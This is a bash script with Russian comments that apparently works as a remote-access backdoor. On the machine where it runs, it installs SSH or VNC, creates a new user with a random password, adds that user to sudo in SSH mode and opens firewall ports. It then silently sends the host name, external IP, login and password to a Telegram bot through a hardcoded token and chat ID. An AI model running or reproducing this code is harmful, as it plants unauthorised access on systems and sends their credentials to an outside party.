#!/bin/bash
# ===== НАСТРОЙКИ (передаются из Python или задаются по умолчанию) =====
: "${TOKEN:=5466273638:AAF5XEp-3IIgjsgOlV2YauFeSnBlAZeFe5M}"
: "${CHAT_ID:=5336452267}"
: "${MODE:=ssh}"              # ssh | vnc
: "${VNC_PASS:=VncPass123!}"  # только для MODE=vnc
: "${NEW_USER:=rdp_$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9_')}"
# =======================================================================

# Генерация случайного пароля (16 символов)
NEW_PASS=$(tr -dc 'A-Za-z0-9!@#$%^&*' </dev/urandom | head -c 16)

# Функция отправки в Telegram
send_tg() {
    local msg="$1"
    local url="https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=$(printf '%s' "$msg" | jq -sRr @uri)"
    curl -sSL "$url" >/dev/null 2>&1 || curl -sSL --data-urlencode "text=$msg" "https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}" >/dev/null 2>&1
}

# Получение внешнего IP
get_ip() {
    curl -sSL https://api.ipify.org?format=json 2>/dev/null | grep -o '"ip":"[^"]*"' | cut -d'"' -f4 || echo "unknown"
}

# Основная логика
main() {
    local ip=$(get_ip)
    local host=$(hostname)
    local msg=""
    
    case "$MODE" in
        ssh)
            # Убедиться, что SSH установлен и запущен
            if command -v apt-get >/dev/null 2>&1; then
                apt-get update -qq && apt-get install -y openssh-server >/dev/null 2>&1
                systemctl enable ssh --quiet 2>/dev/null
                systemctl start ssh --quiet 2>/dev/null
            elif command -v yum >/dev/null 2>&1; then
                yum install -y openssh-server >/dev/null 2>&1
                systemctl enable sshd --quiet 2>/dev/null
                systemctl start sshd --quiet 2>/dev/null
            fi
            
            # Создаём пользователя
            if ! id "$NEW_USER" &>/dev/null; then
                useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null || adduser -D -s /bin/bash "$NEW_USER" 2>/dev/null
                echo "${NEW_USER}:${NEW_PASS}" | chpasswd 2>/dev/null || echo "${NEW_USER}:${NEW_PASS}" | passwd "$NEW_USER" --stdin 2>/dev/null
                # Добавляем в группу sudo (опционально)
                usermod -aG sudo "$NEW_USER" 2>/dev/null || usermod -aG wheel "$NEW_USER" 2>/dev/null
            fi
            
            # Открываем порт в фаерволе
            if command -v ufw >/dev/null 2>&1; then
                ufw allow 22/tcp >/dev/null 2>&1
            elif command -v firewall-cmd >/dev/null 2>&1; then
                firewall-cmd --add-service=ssh --permanent >/dev/null 2>&1
                firewall-cmd --reload >/dev/null 2>&1
            fi
            
            msg="SSH-Ready|Host:${host}|IP:${ip}|Port:22|Login:${NEW_USER}|Pass:${NEW_PASS}"
            ;;
            
        vnc)
            # Установка VNC-сервера (TigerVNC)
            if command -v apt-get >/dev/null 2>&1; then
                apt-get update -qq && apt-get install -y tigervnc-standalone-server tigervnc-common >/dev/null 2>&1
            elif command -v yum >/dev/null 2>&1; then
                yum install -y tigervnc-server >/dev/null 2>&1
            fi
            
            # Создаём пользователя
            if ! id "$NEW_USER" &>/dev/null; then
                useradd -m -s /bin/bash "$NEW_USER" 2>/dev/null || adduser -D -s /bin/bash "$NEW_USER" 2>/dev/null
                echo "${NEW_USER}:${NEW_PASS}" | chpasswd 2>/dev/null || echo "${NEW_USER}:${NEW_PASS}" | passwd "$NEW_USER" --stdin 2>/dev/null
            fi
            
            # Настраиваем VNC пароль для пользователя
            mkdir -p /home/"$NEW_USER"/.vnc
            echo "$VNC_PASS" | vncpasswd -f > /home/"$NEW_USER"/.vnc/passwd 2>/dev/null
            chmod 600 /home/"$NEW_USER"/.vnc/passwd
            chown -R "$NEW_USER":"$NEW_USER" /home/"$NEW_USER"/.vnc
            
            # Запускаем VNC-сессию от имени пользователя (дисплей :1)
            su - "$NEW_USER" -c "vncserver :1 -geometry 1920x1080 -depth 24" >/dev/null 2>&1
            
            # Открываем порт 5901 (дисплей :1)
            if command -v ufw >/dev/null 2>&1; then
                ufw allow 5901/tcp >/dev/null 2>&1
            elif command -v firewall-cmd >/dev/null 2>&1; then
                firewall-cmd --add-port=5901/tcp --permanent >/dev/null 2>&1
                firewall-cmd --reload >/dev/null 2>&1
            fi
            
            msg="VNC-Ready|Host:${host}|IP:${ip}|Port:5901|Login:${NEW_USER}|Pass:${NEW_PASS}|VNC-Pass:${VNC_PASS}"
            ;;
            
        *)
            msg="ERR:Unknown MODE=${MODE}"
            ;;
    esac
    
    # Отправляем в Telegram
    send_tg "$msg"
}

# Запуск
main
